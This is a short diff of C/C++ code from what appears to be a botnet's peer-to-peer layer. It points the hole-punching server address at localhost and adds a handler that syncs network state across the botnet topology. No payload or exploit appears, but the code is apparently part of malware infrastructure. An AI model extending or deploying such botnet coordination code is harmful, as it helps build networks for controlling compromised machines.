@@ -115,7 +115,7 @@ void peer_request()
 	/* destination */
 	server.sin_family = AF_INET;
 	server.sin_port = htons(HOLE_PUNCHING_SERVER_PORT);
-	inet_pton(AF_INET, HOLE_PUNCHING_SERVER_IP, &server.sin_addr);
+	inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);
 
 	/* send request */
 	sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&server, sizeof(server));
@@ -152,6 +152,9 @@ static void handle_udp_connections()
 		break;
 	case PACK_TYPE::PEER_REPLY:
 		botnet_topology.addPeer(p, udp_sock);
+		break;
+	case PACK_TYPE::NETWORK_SYNC:
+		botnet_topology.handleSync(p);
 		break;
 	}
 }
